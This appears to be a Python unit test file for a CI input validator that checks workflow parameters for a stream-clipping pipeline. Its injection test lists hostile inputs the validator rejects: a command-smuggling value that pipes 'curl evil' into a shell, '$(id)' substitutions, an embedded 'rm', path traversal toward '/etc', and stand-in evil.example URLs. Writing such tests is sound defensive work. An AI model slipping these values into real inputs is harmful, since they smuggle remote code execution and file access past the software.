import os, sys, unittest
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts"))
import ci_check_inputs as C
class Inputs(unittest.TestCase):
    def ok(self, **kw): return C.main({("IN_" + k.upper()): v for k, v in kw.items()}, quiet=True) == 0
    def test_good(self):
        self.assertTrue(self.ok(slug="n3on", platform="kick", from_min="0", to_min="60", vod="auto", upload="true", clip_id="123_456", state_dir="state/xqc", credit='O"Neil $(x)'))
    def test_injection_rejected(self):
        for bad in ('x"; curl evil|sh #', "a b", "$(id)", "`id`", "x\nrm", "../x"):
            self.assertFalse(self.ok(slug=bad), bad)
        self.assertFalse(self.ok(from_min="a[$(id)]"))
        self.assertFalse(self.ok(state_dir="../../etc"))
        self.assertFalse(self.ok(clip_id=".hidden/../x"))
        self.assertFalse(self.ok(base_url="https://evil.example/x"))
        self.assertFalse(self.ok(url="https://evil.example"))
    def test_unknown_name_fails(self): self.assertFalse(self.ok(brand_new_input="x"))
if __name__ == "__main__": unittest.main()
